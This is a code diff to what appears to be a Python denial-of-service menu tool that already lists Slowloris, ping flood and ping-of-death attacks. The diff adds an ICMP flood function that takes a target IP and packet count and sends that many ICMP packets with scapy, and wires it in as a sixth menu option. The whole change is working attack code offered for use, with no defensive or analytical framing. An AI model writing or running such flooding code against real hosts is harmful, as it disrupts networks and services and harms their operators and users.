@@ -71,6 +71,12 @@ def Pingofdeath():
     while(1):
         os.system(pingCommand)
 
+def icmpflood():
+    targetip = raw_input("Target IP: ")
+    cycle = raw_input("Number of packets: ")
+
+    for x in range (0,int(cycle)):
+        send(IP(dst=targetip)/ICMP())
 
 def main():
     os.system("clear")
@@ -91,6 +97,7 @@ def main():
     print("3) Slowloris Ping Attack")
     print("4) Ping Flood Attack")
     print("5) Ping of Death Attack")
+    print("6) ICMP Flood Attack")
     option = int(input("Choose an option: "))
     print(option)
     if option == 1:
@@ -148,6 +155,13 @@ def main():
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
 	Pingofdeath()
-	
+    elif option == 6:
+	os.system("clear")
+	print("  ______    ____       _____")
+        print(" /_  __/   / __ \____ / ___/")
+        print("  / /_____/ / / / __ \\__ \ ")
+        print(" / /_____/ /_/ / /_/ /__/ / ")
+        print("/_/     /_____/\____/____/  ")
+	icmpflood()
 if __name__ == "__main__":
     main()
